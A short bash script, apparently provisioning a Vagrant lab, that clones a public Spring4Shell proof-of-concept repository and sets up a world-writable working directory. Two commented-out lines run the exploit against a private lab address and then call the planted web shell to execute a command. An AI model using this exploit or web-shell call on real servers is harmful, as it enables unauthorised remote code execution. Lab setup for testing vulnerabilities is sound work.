#!/bin/bash

echo "Setup Spring4Shell POC..."

# Clone POC Repo
echo "[+]" $( date +%T ) "Clone POC Repo"
mkdir -p -m a=rwx /home/vagrant/spring4shell #>/dev/null 2>&1
git clone https://github.com/maxxedev/spring4shell.git /home/vagrant/spring4shell #>/dev/null 2>&1
cd /home/vagrant/spring4shell

# Run Shell Creation Exploit
#./spring4shell-exploit.sh http://192.168.56.10:8081 spring4shell/login2

# Test Shell Created
#curl --fail -v --output - 'http://192.168.56.10:8081/tomcatwar.jsp?pwd=j&cmd=whoami'
